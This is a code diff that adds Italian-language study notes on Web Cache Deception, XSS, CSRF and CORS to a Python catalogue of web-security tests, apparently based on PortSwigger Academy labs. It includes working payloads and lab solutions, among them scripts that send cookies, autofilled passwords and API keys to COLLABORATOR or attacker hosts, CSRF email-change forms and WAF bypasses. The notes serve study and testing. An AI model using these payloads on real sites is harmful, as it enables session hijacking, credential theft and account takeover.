@@ -1139,6 +1139,341 @@ API_TESTING = macro(
 )
 
 
+# ===========================================================================
+#  14. WEB CACHE DECEPTION
+# ===========================================================================
+WEB_CACHE_DECEPTION = macro(
+    "Web Cache Deception",
+    "Ingannare la cache perche' memorizzi contenuti dinamici e sensibili.",
+    (
+        "La Web Cache Deception induce una cache a memorizzare una risposta dinamica e "
+        "sensibile sfruttando le discrepanze tra come cache e server di origine interpretano "
+        "il percorso URL. L'attaccante fa visitare alla vittima un URL ambiguo (che sembra una "
+        "risorsa statica), la cache memorizza la risposta, poi l'attaccante la rilegge.\n\n"
+        "Diversa dal cache poisoning (che inietta contenuti dannosi serviti ad altri). La "
+        "cache decide cosa salvare dalla 'cache key' (path, query, a volte header) e dalle "
+        "'cache rules' (estensione statica, directory statica, nome file).\n\n"
+        "Prevenzione: Cache-Control no-store/private sui contenuti dinamici; config CDN; "
+        "verifica che il Content-Type corrisponda all'estensione (es. Cloudflare Cache "
+        "Deception Armor)."
+    ),
+    references=PS + "/web-cache-deception",
+    children=[
+        micro("Metodologia", "I passi dell'attacco.", [
+            test("Costruire l'attacco",
+                 goal="Far cachare una risposta dinamica sensibile.",
+                 process="1) Trova un endpoint che restituisce dati sensibili dinamici (GET/HEAD/OPTIONS). 2) Trova una discrepanza tra cache e origine (mappatura, delimitatori, normalizzazione). 3) Crea l'URL malevolo; dopo la visita della vittima rileggi la risposta cachata DA BURP (non dal browser, che potrebbe redirigere/invalidare)."),
+        ]),
+        micro("Regole su estensione statica (path mapping)",
+              "REST vs mappatura tradizionale.", [
+            test("Aggiungere un'estensione statica",
+                 goal="Far interpretare un endpoint dinamico come file statico.",
+                 payload="/api/orders/123/foo        (segmento arbitrario: l'origine lo ignora?)\n/api/orders/123/foo.js     (la cache la salva?)\n-- prova anche .css .ico .exe",
+                 process="Se aggiungendo un segmento la risposta resta la stessa, l'origine astrae il path (REST). Se aggiungendo .js la risposta viene cachata (X-Cache: hit), c'e' una regola su .js: l'origine ignora l'estensione ma la cache no."),
+            lab("Lab: /my-account/wcd.js",
+                process="Lab risolto: /my-account/abc restituisce ancora la API key (origine astrae); /my-account/abc.js dopo due invii da' X-Cache: hit. Exploit: <script>document.location=\"https://LAB/my-account/wcd.js\"</script> alla vittima, poi apri quell'URL e leggi la sua API key."),
+        ]),
+        micro("Discrepanze nei delimitatori",
+              "Caratteri interpretati come confine solo da uno dei due.", [
+            test("Delimitatori specifici del framework",
+                 goal="Troncare il path per l'origine ma non per la cache.",
+                 payload="/profile;foo.css     (Spring: ; e' delimitatore)\n/profile.ico         (Ruby on Rails: .ico non riconosciuto -> HTML)\n/profile%00foo.js    (OpenLiteSpeed: %00 delimitatore; Akamai/Fastly no)",
+                 process="Trova un carattere che l'origine tratta come delimitatore (tronca a /profile) ma la cache no (vede l'estensione statica e salva)."),
+            lab("Lab: delimitatore ;",
+                process="Lab risolto come il precedente ma con /my-account;prova.js (il ; tronca per l'origine, la cache vede .js)."),
+        ]),
+        micro("Discrepanze nella decodifica dei delimitatori",
+              "Un delimitatore codificato decodificato solo da uno dei due.", [
+            test("Delimitatore codificato",
+                 goal="Aggiungere un'estensione vista dalla cache ma non dall'origine.",
+                 payload="/profile%23wcd.css   (origine decodifica %23 in # e tronca; cache no)\n/myaccount%3fwcd.css (cache salva su %3f; poi decodifica in ? e l'origine tronca)",
+                 process="Usa delimitatori codificati; testa anche i non stampabili %00, %0A, %09 che, se decodificati, troncano il path."),
+        ]),
+        micro("Regole su directory statiche (normalizzazione)",
+              "Path traversal codificato interpretato diversamente.", [
+            test("Rilevare la normalizzazione",
+                 goal="Capire chi risolve i dot-segment codificati.",
+                 payload="origine (POST non cacheable):  /aaa/..%2fprofile\ncache (su risorsa cachata):    /aaa/..%2fassets/js/x.js   e  /assets/..%2fjs/x.js",
+                 process="Se /aaa/..%2fprofile torna come /profile, l'origine decodifica lo slash e risolve il dot-segment. Sulla cache verifica se la risposta resta cachata per capire se normalizza. All'inizio codifica solo il secondo slash."),
+            test("Sfruttare la discrepanza",
+                 goal="Far cachare la risorsa dinamica.",
+                 payload="origine normalizza, cache no:  /assets/..%2fprofile\ncache normalizza, origine no:  /profile;%2f%2e%2e%2fstatic",
+                 process="Se l'origine risolve i dot-segment e la cache no: /<dir-statica>/..%2f<path-dinamico>. Nel caso inverso serve anche un delimitatore (es. ;) che tronchi per l'origine ma non per la cache."),
+            lab("Lab: normalizzazione dell'origine",
+                process="Lab risolto con <script>document.location=\"https://LAB/resources/..%2fmy-account\"</script>: la cache vede /resources/..%2fmy-account, l'origine /my-account."),
+            lab("Lab: normalizzazione della cache",
+                process="Lab risolto con /my-account%23%2f%2e%2e%2fresources: %23 e' delimitatore per l'origine ma non per la cache, e la cache decodifica il path traversal mentre l'origine no."),
+        ]),
+        micro("Regole sul nome del file",
+              "robots.txt, index.html, favicon.ico.", [
+            test("Discrepanza di normalizzazione sul nome file",
+                 goal="Far corrispondere il nome file esatto solo per la cache.",
+                 payload="/profile%2f%2e%2e%2findex.html",
+                 process="Verifica con una GET su un file comune se c'e' una regola per nome; sfruttabile solo se la CACHE risolve i dot-segment codificati e l'origine no (il nome deve combaciare esatto)."),
+            lab("Lab: WCD -> furto del CSRF token",
+                process="Lab risolto usando le discrepanze precedenti per rubare il CSRF token della vittima, poi inviandole una richiesta di cambio password costruita con Engagement tools > Generate CSRF PoC."),
+        ]),
+    ],
+)
+
+
+# ===========================================================================
+#  15. CROSS-SITE SCRIPTING (XSS)
+# ===========================================================================
+XSS = macro(
+    "Cross-site Scripting (XSS)",
+    "Far eseguire JavaScript dell'attaccante nel browser della vittima.",
+    (
+        "L'XSS aggira la same-origin policy facendo restituire al sito JavaScript dannoso, "
+        "eseguito nel browser della vittima nel contesto della sua sessione (puo' impersonarla, "
+        "agire e leggere i suoi dati). PoC: alert() (su Chrome, per iframe cross-origin usa "
+        "print()). Tre tipi: Reflected (dalla richiesta HTTP), Stored (dal database), DOM-based "
+        "(nel codice lato client).\n\n"
+        "Prevenzione: filtrare l'input in ingresso, codificare l'output nel contesto giusto "
+        "(HTML/JS/URL/CSS), header Content-Type/X-Content-Type-Options, CSP come ultima difesa."
+    ),
+    references=PS + "/cross-site-scripting",
+    children=[
+        micro("Reflected XSS", "L'input torna subito nella risposta.", [
+            test("Testare un punto riflesso",
+                 goal="Eseguire JS da un input riflesso nella risposta immediata.",
+                 payload="<script>alert(document.domain)</script>",
+                 process="Su ogni punto d'ingresso invia un valore univoco, trova dove si riflette, determina il contesto e prova un payload adatto (Repeater)."),
+            lab("Lab: reflected di base",
+                process="Lab risolto mettendo <script>alert(1)</script> nel campo di ricerca."),
+        ]),
+        micro("Stored XSS", "L'input viene salvato e servito ad altri utenti.", [
+            test("Collegare ingresso e uscita",
+                 goal="Eseguire JS da dati memorizzati (es. commenti).",
+                 payload="<script>alert(1)</script>",
+                 process="Invia un valore a ogni ingresso (commenti, nickname...) e cerca dove ricompare in risposte successive (non solo immediate); testa il contesto di uscita."),
+            lab("Lab: stored di base",
+                process="Lab risolto inserendo <script>alert(1)</script> nel comment box."),
+        ]),
+        micro("DOM-based XSS", "JS lato client che porta una source in un sink pericoloso.", [
+            test("Source -> sink",
+                 goal="Propagare dati da una source (es. location) a un sink (innerHTML, eval, document.write).",
+                 payload="document.write:  \"><svg onload=alert(1)>\ninnerHTML:  <img src=1 onerror=alert(1)>",
+                 process="Metti una stringa univoca nella source e cercala nel DOM (devtools, non 'view source'); identifica il sink e adatta il payload. document.write regge <script>; innerHTML no (usa img/iframe + onerror)."),
+            lab("Lab: document.write / innerHTML",
+                process="Lab risolti: \"><svg onload=alert(1)> nel filtro; ...&storeId=\"></select>...; e <img src=1 onerror=alert(1)> per innerHTML."),
+            test("Librerie: jQuery e AngularJS",
+                 goal="Sink nelle dipendenze di terze parti.",
+                 payload="jQuery attr(href):  ?returnUrl=javascript:alert(document.domain)\njQuery $(location.hash)\nAngularJS:  {{$on.constructor('alert(1)')()}}",
+                 process="jQuery attr()/selettore $() e AngularJS ({{ }} con ng-app) sono source/sink. Verifica AngularJS con {{7*7}} -> 49."),
+            lab("Lab: jQuery href e AngularJS",
+                process="Lab risolti: returnUrl=javascript:alert(document.domain); e, con ng-app, {{$on.constructor('alert(1)')()}} dopo aver visto {{7*7}}=49."),
+            test("DOM XSS riflesso e memorizzato",
+                 goal="Dati dal server che finiscono in un sink lato client.",
+                 payload="riflesso (eval su stringa):  \\\"-alert(1)}//\nmemorizzato (innerHTML):  <><img src=1 onerror=alert(1)>",
+                 process="Il server riflette o memorizza dati che uno script poi scrive in un sink: adatta il payload al contesto JS/HTML dello script."),
+            lab("Lab: DOM riflesso/memorizzato",
+                process="Lab risolti: in search \\\"-alert(1)}// (visto come il JS gestisce l'input); e <><img src=1 onerror=alert(1)> in un commento (il JS rimpiazzava solo il primo set di <>)."),
+        ]),
+        micro("Contesto: tra i tag HTML",
+              "Introdurre nuovi tag che eseguono JS.", [
+            test("Nuovi tag / event handler",
+                 goal="Eseguire JS quando le parentesi angolari passano.",
+                 payload="<script>alert(document.domain)</script>\n<img src=1 onerror=alert(1)>\n<body onresize=...>   <xxx onfocus=... autofocus>   <svg>...",
+                 process="Se un tag e' filtrato, prova tag/handler alternativi (Intruder con la XSS cheat sheet) per aggirare il WAF."),
+            lab("Lab: bypass del WAF con tag/handler",
+                process="Lab risolti trovando cio' che il WAF non filtra: <body onresize>; <test onfocus=alert(document.cookie) tabindex=0 autofocus>; <svg><a><animate attributeName=href values=javascript:alert(1)>...; <svg><animatetransform onbegin=alert(1)>."),
+        ]),
+        micro("Contesto: negli attributi HTML",
+              "Uscire dall'attributo o aggiungerne uno nuovo.", [
+            test("Chiudere o aggiungere attributi",
+                 goal="Eseguire JS da dentro un valore di attributo.",
+                 payload="\"><script>alert(document.domain)</script>\n\" autofocus onfocus=alert(document.domain) x=\"\njavascript:alert(document.domain)   (nell'attributo href)\n'accesskey='x'onclick='alert(1)   (tag canonical)",
+                 process="Termina il valore e chiudi il tag, oppure aggiungi un event handler (autofocus+onfocus). In href usa javascript:; nei tag non interattivi usa accesskey + interazione utente."),
+            lab("Lab: contesti di attributo",
+                process="Lab risolti: \" autofocus onfocus=alert(1) x=\"; javascript:alert(1) nel campo website; /?'accesskey='x'onclick='alert(1) sul tag canonical."),
+        ]),
+        micro("Contesto: in JavaScript",
+              "Uscire dal codice JS gia' presente.", [
+            test("Terminare, uscire dalla stringa, trucchi",
+                 goal="Eseguire JS da dentro uno script esistente.",
+                 payload="</script><img src=1 onerror=alert(document.domain)>\n'-alert(document.domain)-'\n';alert(document.domain)//\n\\';alert(1)//   (neutralizza il backslash aggiunto)\nonerror=alert;throw 1   (senza parentesi)\n&apos;-alert(document.domain)-&apos;   (HTML encoding in un handler)",
+                 process="Chiudi </script>, o esci dalla stringa (riparando la sintassi successiva). Se l'apice e' escapato, usa un tuo backslash; se mancano le parentesi, usa throw+onerror; negli handler sfrutta la decodifica HTML (&apos;)."),
+            lab("Lab: contesti JavaScript",
+                process="Lab risolti: </script><script>alert(1)</script>; '-alert(document.domain)-'; \\'-alert(1)//; http://&apos;-alert(document.domain)-&apos; nel campo website."),
+        ]),
+        micro("Template literal e client-side template injection",
+              "Backtick e framework di template.", [
+            test("JavaScript template literal",
+                 goal="Eseguire JS senza terminare il literal.",
+                 payload="${alert(document.domain)}",
+                 process="Dentro un backtick `...` non serve chiudere la stringa: inserisci ${...} con l'espressione da eseguire."),
+            test("AngularJS: sandbox escape e CSP bypass",
+                 goal="Eseguire JS tramite le espressioni di template.",
+                 payload="'a'.constructor.prototype.charAt=[].join   (sandbox escape classico, con $eval)\n[123]|orderBy:'...'   (quando $eval manca)\n<input autofocus ng-focus=\"$event.path|orderBy:'[].constructor.from([1],alert)'\">   (CSP bypass)",
+                 process="Nelle versioni legacy di AngularJS si evade la sandbox (charAt globale + isIdent); senza $eval si usa il filtro orderBy; in modalita' CSP si usa $event.path + orderBy + from()."),
+        ]),
+        micro("Sfruttare l'XSS", "Da alert() a exploit reali.", [
+            test("Rubare cookie / password / token CSRF",
+                 goal="Dimostrare l'impatto reale.",
+                 payload="cookie:  <script>fetch('https://COLLABORATOR/?c='+encodeURIComponent(document.cookie))</script>\npassword:  <input name=username><input type=password name=password onchange=\"fetch('https://COLLABORATOR',{method:'POST',mode:'no-cors',body:username.value+':'+this.value})\">",
+                 process="Esfiltra document.cookie (limiti: HttpOnly, IP binding, scadenza). Meglio: cattura le password autocompilate dal password manager. Con XSS puoi anche rubare un token CSRF e ottenere comunicazione a due vie."),
+            lab("Lab: furto di cookie e password",
+                process="Lab risolti: <script>fetch('https://COLLABORATOR/?cookie='+encodeURIComponent(document.cookie))</script>; e un form password con onchange che POSTa username:password al Collaborator."),
+        ]),
+        micro("Dangling markup e CSP",
+              "Catturare dati senza XSS completo, e aggirare la CSP.", [
+            test("Dangling markup injection",
+                 goal="Esfiltrare parte della risposta quando l'XSS e' bloccato.",
+                 payload="\"><img src='//attacker-website.com?",
+                 process="Un attributo (es. src) lasciato 'sospeso' cattura tutto fino al prossimo apice e lo manda all'attaccante (puo' contenere token CSRF o dati). Utile quando filtri/CSP bloccano l'XSS."),
+            test("Bypass della CSP (policy injection)",
+                 goal="Indebolire una CSP riflessa.",
+                 payload="; script-src-elem 'unsafe-inline'   (iniettato in una report-uri riflessa)",
+                 process="Se il sito riflette input nella CSP (es. report-uri), aggiungi direttive con ;. script-src-elem puo' sovrascrivere script-src. Molte CSP permettono img: usali per esfiltrare."),
+        ]),
+    ],
+)
+
+
+# ===========================================================================
+#  16. CROSS-SITE REQUEST FORGERY (CSRF)
+# ===========================================================================
+CSRF = macro(
+    "Cross-site Request Forgery (CSRF)",
+    "Indurre la vittima a eseguire azioni non volute sfruttando i suoi cookie.",
+    (
+        "Il CSRF induce un utente autenticato a eseguire un'azione che non intende (cambio "
+        "email/password, trasferimento...). Tre condizioni: un'azione rilevante; sessione "
+        "basata solo su cookie; nessun parametro imprevedibile nella richiesta.\n\n"
+        "Prevenzione: token CSRF (imprevedibile, legato alla sessione, validato sempre), cookie "
+        "SameSite (idealmente Strict), e come ripiego la validazione del Referer."
+    ),
+    references=PS + "/csrf",
+    children=[
+        micro("L'attacco di base", "Far inviare al browser della vittima la richiesta.", [
+            test("Costruire e distribuire il PoC",
+                 goal="Far eseguire l'azione al browser loggato della vittima.",
+                 payload="<form action=\"https://sito/email/change\" method=\"POST\"><input type=hidden name=email value=pwned@evil.net></form><script>document.forms[0].submit()</script>\n-- GET autonomo:\n<img src=\"https://sito/email/change?email=pwned@evil.net\">",
+                 process="Il browser allega automaticamente i cookie di sessione. Costruisci il PoC con Engagement tools > Generate CSRF PoC e distribuiscilo (come per il reflected XSS)."),
+            lab("Lab: CSRF di base",
+                process="Lab risolto catturando la POST di cambio email e creando un PoC con Burp Suite Professional."),
+        ]),
+        micro("Difetti nella validazione del token", "Dove la difesa CSRF sbaglia.", [
+            test("Validazione legata al metodo",
+                 goal="Aggirare il token cambiando metodo.",
+                 payload="GET /email/change?email=pwned@evil.net",
+                 process="Se il token e' validato solo su POST, passa a GET."),
+            lab("Lab: metodo GET",
+                process="Lab risolto catturando la POST, trasformandola in GET in Repeater, poi PoC CSRF senza il token."),
+            test("Validazione legata alla presenza del token",
+                 goal="Aggirare rimuovendo il token.",
+                 process="Se il token e' validato solo quando presente, rimuovi l'intero parametro (non solo il valore)."),
+            lab("Lab: token omesso",
+                process="Lab risolto cancellando il parametro token dalla richiesta e creando un PoC."),
+            test("Token non legato alla sessione",
+                 goal="Usare un proprio token valido.",
+                 process="Se l'app accetta qualsiasi token dal suo pool globale, prendi un token valido dal tuo account e usalo nel PoC per la vittima."),
+            lab("Lab: token dal pool",
+                process="Lab risolto intercettando una richiesta di cambio email dal mio account, droppandola e usando quel token CSRF nel PoC per la vittima."),
+            test("Token legato a un cookie non di sessione",
+                 goal="Sfruttare una cookie-setting per iniettare il proprio csrfKey.",
+                 payload="Cookie: session=...; csrfKey=...   (csrf legato a csrfKey, non alla sessione)",
+                 process="Se il token e' legato a un cookie diverso da quello di sessione e il sito permette di impostare quel cookie (es. riflesso in Set-Cookie), inietta il tuo csrfKey nel browser della vittima e usa il tuo token."),
+            lab("Lab: csrfKey iniettato",
+                process="Lab risolto: csrfKey non legato alla sessione (scambiabile tra account); il parametro search e' riflesso in Set-Cookie (cookie injection); il PoC usa un <img> che prima inietta il csrfKey e nel suo onerror invia il form di cambio email."),
+            test("Token duplicato nel cookie (double submit)",
+                 goal="Inventare un token e iniettarlo come cookie.",
+                 payload="Cookie: csrf=FAKE   +   body: csrf=FAKE",
+                 process="Se l'app confronta solo il token del parametro con quello del cookie (nessuno stato server), inventa un token, iniettalo come cookie nella vittima e mettilo anche nel form."),
+            lab("Lab: double submit",
+                process="Lab risolto iniettando un cookie alla vittima e inviando la richiesta col token uguale al cookie."),
+        ]),
+        micro("Bypassare le restrizioni SameSite", "Lax, Strict e gadget same-site.", [
+            test("SameSite Lax via GET",
+                 goal="Aggirare Lax con una navigazione top-level GET.",
+                 payload="<script>document.location='https://sito/account/transfer?recipient=hacker&amount=1000000'</script>\n-- method override:\n<form method=GET ...><input type=hidden name=_method value=POST>...",
+                 process="Lax invia il cookie su GET da navigazione top-level: se il server accetta GET al posto di POST usa document.location. Alcuni framework (Symfony) onorano _method."),
+            test("SameSite Strict via gadget same-site",
+                 goal="Aggirare Strict con una richiesta secondaria same-site.",
+                 process="Trova un redirect lato client (client-side) costruito da input controllabili: la richiesta risultante e' same-site e porta i cookie anche con Strict (un redirect lato server non funziona)."),
+            lab("Lab: SameSite Strict + redirect gadget",
+                process="Lab risolto: cambio email senza token ma cookie SameSite=Strict; il gadget commentConfirmationRedirect.js usa postId per un redirect manipolabile con ../; sfruttato il redirect client-side per una richiesta autenticata GET (con & codificato %26)."),
+            test("Domini fratelli e CSWSH",
+                 goal="Allargare la superficie same-site.",
+                 process="Una richiesta puo' essere same-site anche da origine diversa: una XSS su un dominio fratello compromette le difese site-based. Se c'e' WebSocket, valuta il cross-site WebSocket hijacking (CSWSH)."),
+        ]),
+        micro("Bypassare le difese basate sul Referer",
+              "Quando la difesa usa l'header Referer.", [
+            test("Validazione legata alla presenza del Referer",
+                 goal="Aggirare omettendo il Referer.",
+                 payload="<meta name=\"referrer\" content=\"no-referrer\">",
+                 process="Se il Referer e' validato solo quando presente, omettilo con un meta referrer nella pagina di attacco."),
+            lab("Lab: Referer omesso",
+                process="Lab risolto: cambiando il dominio del Referer la richiesta e' rifiutata, eliminandolo e' accettata; PoC POST con <meta name=referrer content=no-referrer>."),
+            test("Validazione del Referer aggirabile",
+                 goal="Far contenere al Referer il valore atteso.",
+                 payload="http://sito.com.attacker.com/csrf\nhttp://attacker.com/csrf?sito.com\nResponse header: Referrer-Policy: unsafe-url",
+                 process="Se il controllo e' naive (inizia-con / contiene), metti il dominio atteso come sottodominio o nella query. I browser tagliano la query dal Referer: forza l'URL completo con Referrer-Policy: unsafe-url."),
+        ]),
+    ],
+)
+
+
+# ===========================================================================
+#  17. CORS
+# ===========================================================================
+CORS = macro(
+    "CORS",
+    "Configurazioni CORS deboli che permettono di leggere dati cross-origin.",
+    (
+        "Il CORS allenta in modo controllato la Same-Origin Policy tramite header HTTP: "
+        "Access-Control-Allow-Origin (ACAO) dichiara l'origine consentita e il browser permette "
+        "la lettura della risposta solo se combacia. Per includere i cookie serve "
+        "Access-Control-Allow-Credentials: true (non combinabile con il wildcard *). Le "
+        "richieste non semplici fanno un pre-flight OPTIONS.\n\n"
+        "Il CORS NON protegge dal CSRF; una config errata puo' anzi peggiorarlo. Prevenzione: "
+        "whitelist rigida, mai riflettere l'Origin ne' accettare null, non fidarsi di "
+        "sottodomini HTTP, valutare l'impatto di Allow-Credentials."
+    ),
+    references=PS + "/cors",
+    children=[
+        micro("Concetti", "SOP, ACAO, credenziali, pre-flight.", [
+            test("Come funziona il CORS",
+                 goal="Capire quando una risposta cross-origin e' leggibile.",
+                 process="Un'origine e' schema+dominio+porta. Il browser aggiunge l'header Origin; se la risposta ha ACAO uguale a quell'origine (e Allow-Credentials: true per i cookie), il JS puo' leggerla. Il wildcard * non si combina con le credenziali. Metodi/header non standard scatenano un pre-flight OPTIONS."),
+        ]),
+        micro("ACAO riflesso dall'Origin", "Il server rimanda qualsiasi Origin ricevuta.", [
+            test("Riflessione dell'Origin + credenziali",
+                 goal="Leggere dati sensibili della vittima da qualsiasi sito.",
+                 payload="var req=new XMLHttpRequest();req.open('get','https://sito/sensitive',true);req.withCredentials=true;req.onload=function(){location='//attacker/log?key='+this.responseText};req.send();",
+                 process="Se il server riflette l'Origin in ACAO e manda Allow-Credentials: true, dal tuo sito fai una XHR withCredentials verso l'endpoint sensibile ed esfiltra la risposta (API key, token CSRF)."),
+            lab("Lab: riflessione dell'Origin",
+                process="Lab risolto: /accountDetails riflette qualsiasi Origin con Allow-Credentials: true; sull'exploit server uno script chiama /accountDetails withCredentials (allega i cookie dell'admin) e manda la risposta a /log?key=...; leggi la API key nell'access log."),
+        ]),
+        micro("Errori nel parsing della whitelist", "Match per prefisso/suffisso sbagliati.", [
+            test("Suffisso o prefisso",
+                 goal="Registrare un dominio che supera il controllo.",
+                 payload="whitelist 'termina con normal-website.com'  ->  hackersnormal-website.com\nwhitelist 'inizia con normal-website.com'  ->  normal-website.com.evil-user.net",
+                 process="Se la whitelist confronta prefissi/suffissi o usa regex deboli, registra un dominio che li soddisfa."),
+        ]),
+        micro("Origin null in whitelist", "Alcune app si fidano del valore null.", [
+            test("Generare Origin: null",
+                 goal="Soddisfare una whitelist che include null.",
+                 payload="<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,<script>var req=new XMLHttpRequest();req.open('get','https://sito/sensitive',true);req.withCredentials=true;req.onload=function(){location='//attacker/log?key='+this.responseText};req.send();</script>\"></iframe>",
+                 process="Un iframe sandbox (o redirect cross-origin, protocollo file:, dati serializzati) manda Origin: null. Verifica su Burp che la risposta abbia ACAO: null."),
+            lab("Lab: Origin null",
+                process="Lab risolto con l'iframe sandbox che genera Origin: null; il server risponde ACAO: null e si esfiltra la API key."),
+        ]),
+        micro("Fiducia CORS verso origini vulnerabili", "La fiducia si eredita: XSS e HTTP.", [
+            test("XSS su un sottodominio fidato",
+                 goal="Usare una XSS su un'origine fidata per leggere dati via CORS.",
+                 payload="https://subdomain.sito/?xss=<script>...fetch CORS verso sito...</script>",
+                 process="Se il sito si fida (ACAO) di un sottodominio con XSS, inietta JS che usa il CORS per recuperare dati sensibili (es. API key)."),
+            test("Sottodominio HTTP fidato (compromettere TLS)",
+                 goal="Sfruttare un sottodominio HTTP in whitelist con un MITM.",
+                 payload="ACAO: http://trusted-subdomain.sito",
+                 process="Se un'app HTTPS si fida di un sottodominio in HTTP semplice, un attaccante MITM reindirizza la vittima su quel sottodominio HTTP, inietta una richiesta CORS verso il sito HTTPS con quell'Origin fidata e legge i dati sensibili."),
+        ]),
+    ],
+)
+
+
 # Tutte le macrocategorie, nell'ordine degli appunti.
 MACROS = [
     SQL_INJECTION,
@@ -1154,6 +1489,10 @@ MACROS = [
     XXE,
     NOSQL_INJECTION,
     API_TESTING,
+    WEB_CACHE_DECEPTION,
+    XSS,
+    CSRF,
+    CORS,
 ]
 
 
